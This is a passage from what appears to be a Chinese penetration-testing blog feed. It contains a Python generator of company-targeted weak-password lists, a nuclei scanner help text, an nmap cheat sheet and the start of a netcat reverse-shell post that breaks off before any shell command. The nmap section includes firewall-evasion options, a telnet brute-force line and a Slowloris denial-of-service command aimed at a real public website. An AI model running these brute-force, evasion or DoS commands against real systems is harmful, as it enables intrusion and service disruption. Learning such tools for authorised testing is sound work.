    <url>/2024/07/01/%E4%BD%BF%E7%94%A8%20python%20%E7%BC%96%E5%86%99%E7%9A%84%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h4 id="0、简介-✨"><a href="#0、简介-✨" class="headerlink" title="0、简介 ✨"></a>0、简介 ✨</h4><p>基于企业或单位信息，生成针对性的弱密码字典，提升密码破解成功率，助力安全测试更高效。🔐</p><h4 id="1、代码示例-💻"><a href="#1、代码示例-💻" class="headerlink" title="1、代码示例 💻"></a>1、代码示例 💻</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">result</span>(<span class="hljs-params">password</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;password.txt&#x27;</span>, <span class="hljs-string">&#x27;a+&#x27;</span>) <span class="hljs-keyword">as</span> result_file:<br>        result_file.write(password + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br><span class="hljs-comment"># 关键字前缀</span><br>prefix = [<span class="hljs-string">&#x27;baidu&#x27;</span>, <span class="hljs-string">&#x27;Baidu&#x27;</span>, <span class="hljs-string">&#x27;BAIDU&#x27;</span>]<br><br><span class="hljs-comment"># 组合生成弱密码</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;&#x27;</span>.join(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> itertools.product(<br>        prefix,<br>        [<span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;@@&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>],<br>        [<span class="hljs-string">&#x27;2014&#x27;</span>, <span class="hljs-string">&#x27;2015&#x27;</span>, <span class="hljs-string">&#x27;2016&#x27;</span>, <span class="hljs-string">&#x27;2017&#x27;</span>, <span class="hljs-string">&#x27;2018&#x27;</span>, <span class="hljs-string">&#x27;2019&#x27;</span>, <span class="hljs-string">&#x27;2020&#x27;</span>, <span class="hljs-string">&#x27;2021&#x27;</span>, <span class="hljs-string">&#x27;2022&#x27;</span>, <span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-string">&#x27;1234&#x27;</span>, <span class="hljs-string">&#x27;123456&#x27;</span>],<br>        [<span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;...&#x27;</span>])]:<br>    <span class="hljs-built_in">print</span>(x)<br>    result(x)<br></code></pre></td></tr></table></figure><h4 id="2、生成效果截图-📸"><a href="#2、生成效果截图-📸" class="headerlink" title="2、生成效果截图 📸"></a>2、生成效果截图 📸</h4><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-1719814993448-1.png" alt="img"></p>]]></content>
    
    
    
    <tags>
      
      <tag>弱口令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nuclei 漏洞扫描工具的使用方法</title>
    <link href="/2024/07/01/nuclei%20%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/2024/07/01/nuclei%20%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h4 id="1、常用命令"><a href="#1、常用命令" class="headerlink" title="1、常用命令"></a>1、常用命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描单个目标</span><br>nuclei -u https://example.com -o nuclei_result.txt<br><span class="hljs-comment"># 扫描多个目标 线程[100] 扫描等级[中 高 严重] 排除协议[ssl]</span><br>nuclei -l url.txt -rl 300 -s medium,high,critical -ept ssl -o nuclei_result.txt<br><span class="hljs-comment"># 指定poc扫描</span><br>nuclei -u https://example.com -t ./ultimaste-nuclei-templates/smartbi/smartbi-default-user.yaml<br><span class="hljs-comment"># 使用代理</span><br>nuclei -u https://example.com -p http://127.0.0.1:8080<br><br>nuclei -update                       更新Nuclei到最新版本<br>nuclei -ut         更新Nuclei模板到最新版<br>-ud, -update-directory string        覆盖安装模板<br>-duc, -disable-update-check          禁用更新<br></code></pre></td></tr></table></figure><h4 id="2、基本命令"><a href="#2、基本命令" class="headerlink" title="2、基本命令"></a>2、基本命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nuclei是一款注重于可配置性、可扩展性和易用性的基于模板的快速漏洞扫描器。<br><br>用法：<br>  nuclei [命令]<br><br>命令：<br>目标：<br>   -u, -target string[]                  指定扫描的URL/主机<br>   -l, -list string                      指定需要扫描的URL/主机文件（一行一个）<br>   -resume string                        断点续扫（将禁用集群）<br><br>模板：<br>   -nt, -new-templates                   只扫描最新版本中添加的模板<br>   -ntv, -new-templates-version string[] 运行在特定版本中添加的新模板<br>   -as, -automatic-scan                  在自动web扫描中使用wappalyzer技术检测的指纹<br>   -t, -templates string[]               指定需要扫描的模板或者模板的路径（逗号分隔，文件）<br>   -tu, -template-url string[]           从URL加载模板（逗号分隔，文件）<br>   -w, -workflows string[]               指定扫描中的工作流或者工作流目录（逗号分隔，文件）<br>   -wu, -workflow-url string[]           从URL加载工作流（逗号分隔，文件）<br>   -validate                             验证通过的模板<br>   -nss, -no-strict-syntax               禁用模板的严格检查<br>   -tl                                   列出所有可用的模板<br>   -reset 选项重置核心配置并删除旧的/过时的模板<br><br>过滤：<br>   -a, -author string[]                  执行指定作者的模板（逗号分隔，文件）<br>   -tags string[]                        执行有标记的模板子集（逗号分隔，文件）<br>   -etags, -exclude-tags string[]        执行标记为排除的模板（逗号分隔，文件）<br>   -itags, -include-tags string[]        执行默认或者配置排除的标记模板<br>   -<span class="hljs-built_in">id</span>, -template-id string[]            执行指定ID的模板（逗号分隔，文件）<br>   -eid, -exclude-id string[]            执行排除指定ID的模板（逗号分隔，文件）<br>   -it, -include-templates string[]      执行默认或配置中排除的模板<br>   -et, -exclude-templates string[]      要排除的模板或者模板目录（逗号分隔，文件）<br>   -em, -exclude-matchers string[]       在结果中排除指定模板<br>   -s, -severity value[]                 根据严重程度运行模板，可候选的值有：info,low,medium,high,critical   <br>   -es, -exclude-severity value[]        根据严重程度排除模板，可候选的值有：info,low,medium,high,critical<br>   -pt, -<span class="hljs-built_in">type</span> value[]                    根据协议运行模板，可候选的值有：dns, file, http, headless, network, workflow, ssl, websocket, whois<br>   -ept, -exclude-type value[]           根据协议排除模板，可候选的值有：dns, file, http, headless, network, workflow, ssl, websocket, whois<br>   -tc, -template-condition string[]      根据表达式运行模板<br>   <br><br>输出：<br>   -o, -output string                    输出发现的问题到文件<br>   -sresp, -store-resp                   将nuclei的所有请求和响应输出到目录<br>   -srd, -store-resp-dir string          将nuclei的所有请求和响应输出到指定目录（默认：output）<br>   -silent                               只显示结果<br>   -nc, -no-color                        禁用输出内容着色（ANSI转义码）<br>   -j, -jsonl                            输出为jsonL（ines）<br>   -irr, -include-rr                     在JSONL中输出对应的请求和相应（仅结果）<br>   -nm, -no-meta                         不显示匹配的元数据<br>   -nts, -no-timestamp                   不在输出中显示时间戳<br>   -rdb, -report-db string               本地的Nuclei结果数据库（始终使用该数据库保存结果）<br>   -ms, -matcher-status                  显示匹配失败状态<br>   -me, -markdown-export string          以markdown导出结果<br>   -se, -sarif-export string             以SARIF导出结果<br><br>配置：<br>   -config string                        指定Nuclei的配置文件<br>   -fr, -follow-redirects                为HTTP模板启用重定向<br>   -fhr, -follow-host-redirects          在同一主机上重定向<br>   -mr, -max-redirects int               HTTP模板最大重定向次数（默认：10）<br>   -dr, -disable-redirects               为HTTP模板禁用重定向<br>   -rc, -report-config string            指定Nuclei报告模板文件<br>   -H, -header string[]                  指定header、cookie，以header:value的方式（cli，文件）<br>   -V, -var value                        通过key=value指定var值<br>   -r, -resolvers string                 指定Nuclei的解析文件<br>   -sr, -system-resolvers                当DNS错误时使用系统DNS<br>   -passive                              启用被动扫描处理HTTP响应<br>   -ev, env-vars                         在模板中使用环境变量<br>   -cc, -client-cert string              用于对扫描的主机进行身份验证的客户端证书文件（PEM 编码）<br>   -ck, -client-key string               用于对扫描的主机进行身份验证的客户端密钥文件（PEM 编码）<br>   -ca, -client-ca string                用于对扫描的主机进行身份验证的客户端证书颁发机构文件（PEM 编码）<br>   -sml, -show-match-line                显示文件模板的匹配值，只适用于提取器<br>   -ztls                                 对ztls自动退回到tls13<br>   -sni string                           指定tls sni的主机名（默认为输入的域名）<br>   -i, -interface string                 指定网卡<br>   -sip, -source-ip string               指定源IP<br>   -config-directory string              重写默认配置路径（<span class="hljs-variable">$home</span>/.config）<br>   -rsr, -response-size-read int         最大读取响应大小（默认：10485760字节）<br>   -rss, -response-size-save int         最大储存响应大小（默认：10485760字节）<br><br>交互：<br>   -inserver, -ineractsh-server string   使用interactsh反连检测平台（默认为oast.pro,oast.live,oast.site,oast.online,oast.fun,oast.me）<br>   -itoken, -interactsh-token string     指定反连检测平台的身份凭证<br>   -interactions-cache-size int          指定保存在交互缓存中的请求数（默认：5000）<br>   -interactions-eviction int            从缓存中删除请求前等待的时间（默认为60秒）<br>   -interactions-poll-duration int       每个轮询前等待时间（默认为5秒）<br>   -interactions-cooldown-period int     退出轮询前的等待时间（默认为5秒）<br>   -ni, -no-interactsh                   禁用反连检测平台，同时排除基于反连检测的模板<br><br>限速：<br>   -rl, -rate-limit int                  每秒最大请求量（默认：150）<br>   -rlm, -rate-limit-minute int          每分钟最大请求量<br>   -bs, -bulk-size int                   每个模板最大并行检测数（默认：25）<br>   -c, -concurrency int                  并行执行的最大模板数量（默认：25）<br>   -hbs, -headless-bulk-size int         每个模板并行运行的无头主机最大数量（默认：10）<br>   -headc, -headless-concurrency int     并行指定无头主机最大数量（默认：10）<br><br><br>优化：<br>   -<span class="hljs-built_in">timeout</span> int                          超时时间（默认为10秒）<br>   -retries int                          重试次数（默认：1）<br>   -ldp, -leave-default-ports            指定HTTP/HTTPS默认端口（例如：host:80，host:443）<br>   -mhe, -max-host-error int             某主机扫描失败次数，跳过该主机（默认：30）<br>   -te, -track-error string[]            将给定错误添加到最大主机错误监视列表（标准、文件）<br>   -nmhe, -no-mhe                        <span class="hljs-built_in">disable</span> skipping host from scan based on errors<br>   -project                              使用项目文件夹避免多次发送同一请求<br>   -project-path string                  设置特定的项目文件夹<br>   -spm, -stop-at-first-path             得到一个结果后停止（或许会中断模板和工作流的逻辑）<br>   -stream                               流模式 - 在不整理输入的情况下详细描述<br>   -irt, -input-read-timeout duration    输入读取超时时间（默认：3分钟）<br>   -no-stdin                             禁用标准输入<br><br>无界面浏览器：<br>    -headless                            启用需要无界面浏览器的模板<br>    -page-timeout int                    在无界面下超时秒数（默认：20）<br>    -sb, -show-brower                    在无界面浏览器运行模板时，显示浏览器<br>    -sc, -system-chrome                  不使用Nuclei自带的浏览器，使用本地浏览器<br>    -lha, -list-headless-action          列出可用的无界面操作<br><br>调试：<br>    -debug                               显示所有请求和响应<br>    -dreq, -debug-req                    显示所有请求<br>    -dresp, -debug-resp                  显示所有响应<br>    -p, -proxy string[]                  使用http/socks5代理（逗号分隔，文件）<br>    -pi, -proxy-internal                 代理所有请求<br>    -ldf, -list-dsl-function             列出所有支持的DSL函数签名<br>    -tlog, -trace-log string             写入跟踪日志到文件<br>    -elog, -error-log string             写入错误日志到文件<br>    -version                             显示版本信息<br>    -hm, -hang-monitor                   启用Nuclei的监控<br>    -v, -verbose                         显示详细信息<br>    -profile-mem string                  将Nuclei的内存转储成文件<br>    -vv                                  显示额外的详细信息<br>    -ep, -enable-pprof                   启用pprof调试服务器<br>    -tv, -templates-version              显示已安装的模板版本<br>    -hc, -health-check                   运行诊断检查<br><br>升级：<br>    -update                              更新Nuclei到最新版本<br>    -ut, -update-templates               更新Nuclei模板到最新版<br>    -ud, -update-directory string        覆盖安装模板<br>    -duc, -disable-update-check          禁用更新<br><br>统计：<br>    -stats                               显示正在扫描的统计信息<br>    -sj, -stats-json                     将统计信息以JSONL格式输出到文件<br>    -si, -stats-inerval int              显示统计信息更新的间隔秒数（默认：5）<br>    -m, -metrics                         显示Nuclei端口信息<br>    -mp, -metrics-port int               更改Nuclei默认端口（默认：9092）<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>扫描工具</tag>
      
      <tag>漏洞扫描</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nmap 端口扫描工具的使用方法</title>
    <link href="/2024/07/01/nmap%20%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/2024/07/01/nmap%20%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="📌-1、常用命令"><a href="#📌-1、常用命令" class="headerlink" title="📌 1、常用命令"></a>📌 1、常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 批量资产扫描</span><br><span class="hljs-built_in">nohup</span> nmap -sT -iL ip.txt -PN -p- --min-rate 2000 -oX result.xml &amp;<br><br><span class="hljs-comment"># 扫描单个目标</span><br>nmap 192.168.1.100<br><br><span class="hljs-comment"># 扫描多个目标</span><br>nmap 192.168.1.100 192.168.1.111 192.168.2.8<br>nmap 192.168.1.100,111,115,127<br>nmap 192.168.1.100-200<br><br><span class="hljs-comment"># 扫描整个网段</span><br>nmap 192.168.1.0/24<br>nmap 192.168.0.0/16<br><br><span class="hljs-comment"># -A 开启操作系统检测、版本检测、脚本扫描和 traceroute</span><br>nmap -A 192.168.1.100<br><br><span class="hljs-comment"># -O 仅检测操作系统</span><br>nmap -O 192.168.1.100<br><br><span class="hljs-comment"># -PN 跳过 ping（对方禁 ping 时用）</span><br>nmap -PN 192.168.1.111<br><br><span class="hljs-comment"># -sn 只探测存活主机（Ping Scan）</span><br>nmap -sn 192.168.1.1/24<br><br><span class="hljs-comment"># -p 指定端口</span><br>nmap -p 80,443,135,445 192.168.1.100<br>nmap -p 80-1000 192.168.1.100   <span class="hljs-comment"># 扫描80-1000端口</span><br>nmap -p- 192.168.1.100          <span class="hljs-comment"># 扫描1-65535所有端口</span><br><br><span class="hljs-comment"># 使用 Ping 扫描</span><br>nmap -sP 192.168.1.100<br><br><span class="hljs-comment"># TCP 全连接扫描</span><br>nmap -sT 192.168.1.100<br><br><span class="hljs-comment"># UDP 扫描</span><br>nmap -sU 192.168.1.100<br><br><span class="hljs-comment"># SYN 半开放扫描（最常用）</span><br>nmap -sS 192.168.1.100<br><br><span class="hljs-comment"># ACK 扫描</span><br>nmap -PA 192.168.1.120<br><br><span class="hljs-comment"># 使用 IP 列表文件扫描</span><br>nmap -iL ip.txt<br></code></pre></td></tr></table></figure><hr><h2 id="📌-2、时间与速率选项"><a href="#📌-2、时间与速率选项" class="headerlink" title="📌 2、时间与速率选项"></a>📌 2、时间与速率选项</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 探测报文延迟时间（-T0 ~ -T5，数值越大越快）</span><br>nmap -T4 192.168.1.100<br><br><span class="hljs-comment"># 各时间模板含义：</span><br><span class="hljs-comment"># -T0 偏执（极慢，适合 IDS 规避）</span><br><span class="hljs-comment"># -T1 猥琐（很慢）</span><br><span class="hljs-comment"># -T2 有礼貌（比默认慢）</span><br><span class="hljs-comment"># -T3 普通（默认）</span><br><span class="hljs-comment"># -T4 野蛮（假设网络条件好）</span><br><span class="hljs-comment"># -T5 疯狂（非常快，可能丢端口）</span><br><br><span class="hljs-comment"># 设置 TTL</span><br>nmap --ttl 100 192.168.1.100<br><br><span class="hljs-comment"># 设置单个主机最大扫描时间</span><br>nmap --host-timeout 1m 192.168.1.100<br><br><span class="hljs-comment"># 设置每次探测的间隔</span><br>nmap --scan-delay 10s 192.168.1.100<br><br><span class="hljs-comment"># 最低速率（包/秒）</span><br>nmap --min-rate 50 192.168.1.100<br><br><span class="hljs-comment"># 最高速率（包/秒）</span><br>nmap --max-rate 10 192.168.1.100<br></code></pre></td></tr></table></figure><hr><h2 id="📌-3、绕过防火墙"><a href="#📌-3、绕过防火墙" class="headerlink" title="📌 3、绕过防火墙"></a>📌 3、绕过防火墙</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用分片封包</span><br>nmap -f 192.168.1.111<br><br><span class="hljs-comment"># 使用特定网卡（示例，若不生效可忽略）</span><br>nmap -e eth0 192.168.1.100<br><br><span class="hljs-comment"># 指定最大传输单位（8的倍数）</span><br>nmap --mtu 8 192.168.1.100<br><br><span class="hljs-comment"># 使用伪装 IP（诱饵）</span><br>nmap -D RND:10 192.168.1.100<br>nmap -D 10.10.1.111,10.10.1.112 192.168.1.100<br><br><span class="hljs-comment"># 指定源端口</span><br>nmap --source-port 88 192.168.1.100<br><br><span class="hljs-comment"># 加入随机数据</span><br>nmap --data-length 25 192.168.1.100<br><br><span class="hljs-comment"># 故意发错校验和</span><br>nmap --badsum 192.168.1.111<br></code></pre></td></tr></table></figure><hr><h2 id="📌-4、结果输出"><a href="#📌-4、结果输出" class="headerlink" title="📌 4、结果输出"></a>📌 4、结果输出</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 标准输出</span><br>nmap -oN scan.txt 192.168.1.1/24<br><br><span class="hljs-comment"># XML 输出</span><br>nmap -oX scan.xml 192.168.1.1/24<br><br><span class="hljs-comment"># Grep 输出（方便 grep）</span><br>nmap -oG scan.grep 192.168.1.1/24<br><br><span class="hljs-comment"># 同时生成所有格式</span><br>nmap -oA scan 192.168.1.1/24<br></code></pre></td></tr></table></figure><hr><h2 id="📌-5、常用脚本-NSE"><a href="#📌-5、常用脚本-NSE" class="headerlink" title="📌 5、常用脚本 NSE"></a>📌 5、常用脚本 NSE</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描常规漏洞</span><br>nmap --script=vuln 192.168.1.100<br><br><span class="hljs-comment"># 扫描 MySQL 空口令</span><br>nmap -p 3306 --script=mysql-empty-password 192.168.1.100<br><br><span class="hljs-comment"># Telnet 暴力破解</span><br>nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=pass.txt,telnet-brute.timeout=8s 192.168.1.100<br><br><span class="hljs-comment"># 检查 robots.txt</span><br>nmap --script=http-robots.txt www.baidu.com<br><br><span class="hljs-comment"># Slowloris 攻击（演示）</span><br>nmap --script http-slowloris --max-parallelism 1000 www.baidu.com<br><br><span class="hljs-comment"># 获取 Banner</span><br>nmap --script banner 192.168.1.100<br><br><span class="hljs-comment"># 使用所有 http* 开头的脚本</span><br>nmap --script <span class="hljs-string">&quot;http*&quot;</span> www.baidu.com<br><br><span class="hljs-comment"># 默认脚本（信息收集）</span><br>nmap --script default 192.168.1.100<br><span class="hljs-comment"># 简化写法</span><br>nmap -sC 192.168.1.100<br><br><span class="hljs-comment"># 更新脚本数据库</span><br>nmap --script-updatedb<br></code></pre></td></tr></table></figure><hr><h2 id="⚡-小贴士"><a href="#⚡-小贴士" class="headerlink" title="⚡ 小贴士"></a>⚡ 小贴士</h2><p>✅ 推荐配合 <code>--min-rate</code> 或 <code>--max-rate</code> 调速，避免被防火墙拉黑<br>✅ 使用 <code>-sS</code> 配合 <code>-PN</code>，对目标更隐蔽<br>✅ 扫描大网段时，配合 <code>nohup</code> + 输出文件，避免丢结果</p>]]></content>
    
    
    
    <tags>
      
      <tag>扫描工具</tag>
      
      <tag>端口扫描</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用 nc 反弹shell</title>
    <link href="/2024/07/01/%E4%BD%BF%E7%94%A8%20nc%20%E5%8F%8D%E5%BC%B9shell/"/>
    <url>/2024/07/01/%E4%BD%BF%E7%94%A8%20nc%20%E5%8F%8D%E5%BC%B9shell/</url>
    
    <content type="html"><![CDATA[<h4 id="🚀-0、简介"><a href="#🚀-0、简介" class="headerlink" title="🚀 0、简介"></a>🚀 0、简介</h4><p><code>nc</code>（Netcat）被誉为网络中的瑞士军刀，功能强大且用途多样，既能进行端口扫描、监听，也能用于反弹shell、文件传输等。</p><hr><h4 id="⚙️-参数说明"><a href="#⚙️-参数说明" class="headerlink" title="⚙️ 参数说明"></a>⚙️ 参数说明</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">-h    查看帮助信息   <br>-d    后台模式   <br>-e    程序重定向，一旦连接就执行（危险）  <br>-i    延时秒数  <br>-l    监听模式，用于入站连接   <br>-L    监听模式，连接关闭后仍继续监听，直到 Ctrl+C   <br>-n    使用IP地址，禁止域名解析   <br>-o    记录16进制传输内容   <br>-p    本地端口号   <br>-r    随机本地及远程端口  <br>-t    使用Telnet交互方式   <br>-u    UDP模式  <br>-v    详细输出，用 -vv 更详细   <br>-w    超时设置（秒）   <br>-z    不发送数据（用于端口扫描）<br></code></pre></td></tr></table></figure><hr><h4 id="🎯-1、基本用法示例"><a href="#🎯-1、基本用法示例" class="headerlink" title="🎯 1、基本用法示例"></a>🎯 1、基本用法示例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描端口范围</span><br>nc.exe -nvv -w2 